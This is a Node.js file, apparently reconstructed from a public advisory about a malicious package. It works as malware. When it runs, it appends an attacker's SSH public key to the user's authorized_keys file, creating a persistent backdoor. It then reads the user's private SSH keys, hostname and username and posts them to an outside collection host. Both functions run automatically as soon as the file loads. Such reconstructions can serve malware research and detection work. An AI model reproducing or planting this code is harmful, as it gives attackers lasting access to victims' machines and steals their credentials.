// ssh-authorized-keys — reconstructed from public security analyses
// Source: https://github.com/advisories/GHSA-wwg3-329c-vh59
//
// Appends attacker's public SSH key to ~/.ssh/authorized_keys, creating
// a persistent SSH backdoor that survives package removal.
//
// Technique: SSH authorized_keys injection + persistent backdoor

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");

var home = os.homedir();
var sshDir = path.join(home, ".ssh");
var authKeysFile = path.join(sshDir, "authorized_keys");

// Attacker's SSH public key
var attackerKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7fake+key+for+reconstruction+only/placeholder== attacker@c2";

function injectKey() {
  try {
    // Ensure .ssh directory exists
    if (!fs.existsSync(sshDir)) {
      fs.mkdirSync(sshDir, { mode: 0o700 });
    }

    // Read existing authorized_keys
    var existing = "";
    try {
      existing = fs.readFileSync(authKeysFile, "utf8");
    } catch(e) {}

    // Only inject if not already present
    if (!existing.includes(attackerKey)) {
      fs.appendFileSync(authKeysFile, "\n" + attackerKey + "\n");
      fs.chmodSync(authKeysFile, 0o600);
    }
  } catch(e) {}
}

// Also exfiltrate existing SSH keys
function exfilKeys() {
  var keyFiles = ["id_rsa", "id_ed25519", "id_ecdsa"];
  var stolen = {};

  keyFiles.forEach(function(kf) {
    var keyPath = path.join(sshDir, kf);
    try {
      if (fs.existsSync(keyPath)) {
        stolen[kf] = fs.readFileSync(keyPath, "utf8");
      }
    } catch(e) {}
  });

  if (Object.keys(stolen).length > 0) {
    var payload = JSON.stringify({
      host: os.hostname(),
      user: os.userInfo().username,
      keys: stolen
    });

    var req = https.request({
      hostname: "collect.grammy-utils.com",
      path: "/keys",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload)
      }
    });
    req.write(payload);
    req.end();
  }
}

injectKey();
exfilKeys();
